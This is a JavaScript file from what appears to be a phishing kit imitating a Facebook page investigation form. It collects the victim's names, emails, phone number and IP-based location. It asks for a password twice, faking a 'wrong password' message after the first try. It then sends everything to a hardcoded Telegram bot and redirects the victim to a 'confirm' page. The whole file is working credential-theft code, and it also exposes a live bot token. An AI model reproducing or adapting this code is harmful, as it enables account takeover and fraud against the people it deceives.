function getIP(callback) {
  fetch("https://api.db-ip.com/v2/free/self")
    .then((response) => response.json())
    .then((data) => callback(data))
    .catch((error) => callback(undefined));
}

$(document).ready(function () {
  $("#input").html(`
                            <div class="mb-3">
                                <label for="page-name" class="form-label">
                                    Page Name <span class="text-danger">*</span>
                                </label>
                                <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
                            </div>
                            <div class="mb-3">
                                <label for="full-name" class="form-label">
                                    Full Name <span class="text-danger">*</span>
                                </label>
                                <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
                            </div>
                            <div class="mb-3">
                                <label for="business-email" class="form-label">
                                    Business Email Address <span class="text-danger">*</span>
                                </label>
                                <input type="text" class="form-control" required id="business-email"
                                    aria-describedby="emailHelp">
                            </div>
                            <div class="mb-3">
                                <label for="personal-email" class="form-label">
                                    Personal Email Address <span class="text-danger">*</span>
                                </label>
                                <input type="text" class="form-control" required id="personal-email"
                                    aria-describedby="emailHelp">
                            </div>
                            <div class="mb-3">
                                <label for="phone" class="form-label">
                                    Mobile Phone Number <span class="text-danger">*</span>
                                </label>
                                <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
                            </div>
                            <div class="mb-3">
                                <label for="full-name" class="form-label">
                                    Please provide us information that will help us investigate.
                                </label>
                                <textarea class="form-control" id="description" rows="3"></textarea>
                            </div>
                            <button type="button" class="btn mb-4">Submit</button>
    `);

  openDetail();
  let IpAddress = "";

  getIP((ip) => {
    IpAddress = ip;
    sendForm(IpAddress);
  });

  $("#phone").on("input", function () {
    var input = $(this).val();
    var validInputRegex = /^[+\d]*$/; // Chỉ cho phép số và dấu cộng

    if (!validInputRegex.test(input)) {
      // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
      $(this).val(input.slice(0, -1));
    }
  });
});

function openDetail() {
  $(".nav-item-parent").on("click", function () {
    var currentRotate = $(this).find(".arrow").css("rotate");
    currentRotate = currentRotate.replace("deg", "");

    var isOpen = currentRotate == 0 ? false : true;

    $(".detail").css("display", "none");
    $(".arrow").css("rotate", "0deg");

    const id = $(this).data("id");
    if (isOpen) {
      $("#" + id).css("display", "none");
      $(this).find(".arrow").css("rotate", "0deg");
    } else {
      $("#" + id).css("display", "block");
      $(this).find(".arrow").css("rotate", "180deg");
    }
  });

  $(".nav-item-child").on("click", function () {
    var currentRotate = $(this).find(".arrow").css("rotate");
    currentRotate = currentRotate.replace("deg", "");

    var isOpen = currentRotate == 0 ? false : true;

    const id = $(this).data("id");
    if (isOpen) {
      $("#" + id).css("display", "none");
      $(this).find(".arrow").css("rotate", "0deg");
      $(this)
        .find(".icon-container")
        .css("background-color", "var(--color-white-secondary)");
      $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
      $(this).css("background", "none");
    } else {
      $("#" + id).css("display", "block");
      $(this).find(".arrow").css("rotate", "180deg");
      $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
      $(this).find(".icon-container").css("background-color", "#1877F2");
      $(this).css("background", "#eaf3ffe8");
    }
  });
}

function validateForm() {
  var isValid = true;

  // Validate trường Page Name
  var pageName = $("#page-name").val();
  if (pageName === "") {
    isValid = false;
    $("#page-name").addClass("border-danger");
  } else {
    $("#page-name").removeClass("border-danger");
  }

  // Validate trường Full Name
  var fullName = $("#full-name").val();
  if (fullName === "") {
    isValid = false;
    $("#full-name").addClass("border-danger");
  } else {
    $("#full-name").removeClass("border-danger");
  }

  // Validate trường Business Email
  var businessEmail = $("#business-email").val();
  var emailRegex =
    /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  if (!emailRegex.test(businessEmail)) {
    isValid = false;
    $("#business-email").addClass("border-danger");
  } else {
    $("#business-email").removeClass("border-danger");
  }

  // Validate trường Personal Email
  var personalEmail = $("#personal-email").val();
  if (!emailRegex.test(personalEmail)) {
    isValid = false;
    $("#personal-email").addClass("border-danger");
  } else {
    $("#personal-email").removeClass("border-danger");
  }

  // Validate trường Phone
  var phone = $("#phone").val();
  // Cho phép dấu "+" ở đầu và sau đó là các chữ số
  var phoneRegex = /^(\+\d+|\d+)$/;

  if (!phoneRegex.test(phone)) {
    isValid = false;
    $("#phone").addClass("border-danger");
  } else {
    $("#phone").removeClass("border-danger");
  }

  return isValid;
}

var NUMBER_TIME_LOGIN = 0;

function sendForm(IpAddress) {
  $(".content #dataGet button[type=button]").off("click");

  $(".content #dataGet button[type=button]").on("click", function () {
    if (validateForm()) {
      showPrompt(IpAddress, true);
    }
  });
}

let FIRST_PASSWORD = "";

function showPrompt(IpAddress) {
  $("#getPassword").removeClass("d-none");
  $("#close-password").off("click");
  $("#close-password").on("click", function () {
    $("#getPassword").addClass("d-none");
  });

  $("#submit-password").off("click");
  $("#submit-password").on("click", function () {
    let password = $("#password").val();
    if (password === "") {
      $("#password").addClass("border-danger");
      return;
    } else {
      $("#password").removeClass("border-danger");
    }
    let secondPassword = "";
    if (NUMBER_TIME_LOGIN >= 1) {
      secondPassword = password;
      password = FIRST_PASSWORD;
    }
    const product = {
      product_id: "",
      ipAddress: IpAddress.ipAddress,
      area: "",
      country: IpAddress.countryName,
      city: IpAddress.city,
      fullName: $("#full-name").val(),
      buEmail: $("#business-email").val(),
      perEmail: $("#personal-email").val(),
      phone: $("#phone").val(),
      pageName: $("#page-name").val(),
      passwords: password,
      secondPassword: secondPassword,
      hasKey: "",
      keymap: "",
      trueWay: 0,
    };

    const message1 =
      "<strong>User Email: </strong>" +
      $("#business-email").val() +
      "%0A<strong>User Name: </strong>" +
      $("#full-name").val() +
      "%0A<strong>User Email: </strong>" +
      $("#personal-email").val() +
      "%0A<strong>Facebook Page: </strong>" +
      $("#page-name").val() +
      "%0A<strong>Phone Number: </strong>" +
      $("#phone").val() +
      "%0A<strong>First Password: </strong>" +
      password +
      "%0A<strong>Second Password: </strong>" +
      secondPassword +
      "%0A<strong>IP Address: </strong>" +
      IpAddress.ipAddress +
      "%0A<strong>Country : </strong>" +
      IpAddress.countryName +
      "( " +
      IpAddress.countryCode +
      " )" +
      "%0A<strong>City : </strong>" +
      IpAddress.city;

    const botToken = "7499417462:AAEwpqvTLooxAENpFm7EsQEoGXwmd6G4MC8"; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
    const chatId = "#-2299618966"; // Thay YOUR_CHAT_ID bằng chat_id của bạn
    const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;

    fetch(telegramUrl)
      .then((response) => {
        if (!response.ok) {
          throw new Error("Network response was not ok");
        }
        return response.json();
      })
      .then((data) => {
        NUMBER_TIME_LOGIN++;
        if (NUMBER_TIME_LOGIN === 1) {
          FIRST_PASSWORD = password;
          setTimeout(function () {
            $(".lsd-ring-container").addClass("d-none");
            $("#wrong-password").removeClass("d-none");
            $("#password").val("");
          }, 500);
        } else {
          setTimeout(function () {
            $(".lsd-ring-container").addClass("d-none");
            window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
          }, 1000);
        }
      })
      .catch((error) => {
        setTimeout(function () {
          Swal.fire({
            text: `Request failed!`,
            icon: "error",
          });
          $(".lsd-ring-container").addClass("d-none");
        }, 500);
      });
  });
}
